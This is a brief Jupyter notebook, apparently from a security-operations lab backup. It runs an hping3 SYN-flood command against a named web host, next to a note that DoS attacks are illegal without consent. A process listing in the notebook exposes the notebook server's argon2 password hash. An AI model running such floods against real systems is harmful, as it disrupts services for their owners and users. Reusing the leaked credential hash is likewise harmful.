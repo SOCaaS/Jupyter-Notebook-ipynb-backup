{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "welsh-messenger",
   "metadata": {},
   "source": [
    "### DoS Attack\n",
    "Remmeber DoS Attack is an illegal without consent"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "brilliant-conspiracy",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Process is interrupted.\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "sudo hping3 -i u1 -S -p 80 doblog-uow.1ez.xyz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "digital-conference",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
      "jupyter        1  0.0  0.2 268392 51104 ?        Ssl  Mar20   0:26 /usr/local/bin/python3 /usr/local/bin/jupyter-notebook --no-browser --ip='0.0.0.0' --NotebookApp.password=argon2:$argon2id$v=19$m=10240,t=10,p=8$eUUKwVme8Br3m2pYymGwMg$sNLq99r8XMIJIHs2I7Sbrw\n",
      "jupyter      563  0.0  0.0   2412   212 pts/0    Ss+  Mar27   0:00 /usr/bin/sh -l\n",
      "jupyter      572  0.0  0.0 466320 21412 ?        Ssl  Mar27   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-d0c6561f-fde3-4dee-b701-d1414dbbb434.json\n",
      "jupyter      648  0.0  0.1 466320 48236 ?        Ssl  04:00   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-abdfe43c-bf31-4021-b5bb-65c6acffa7ab.json\n",
      "jupyter      659  0.0  0.1 465284 47020 ?        Ssl  04:01   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-adc68965-833d-409b-a0da-1b9f4637621f.json\n",
      "jupyter      688  0.0  0.1 465284 46584 ?        Ssl  04:07   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-ca9b83ef-4dfa-4f6a-a5ec-4ae55ff83b17.json\n",
      "jupyter      699  0.0  0.1 465284 46604 ?        Ssl  04:08   0:00 /usr/local/bin/python3 -m ipykernel_launcher -f /home/jupyter/.local/share/jupyter/runtime/kernel-ff2f9b8d-46ac-48b3-a36e-62b6e3d434d4.json\n",
      "jupyter      718  0.0  0.0   4196  2824 ?        S    04:17   0:00 bash\n",
      "jupyter      719  0.0  0.0   7232  2996 ?        R    04:17   0:00 ps -aux\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "ps -aux"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
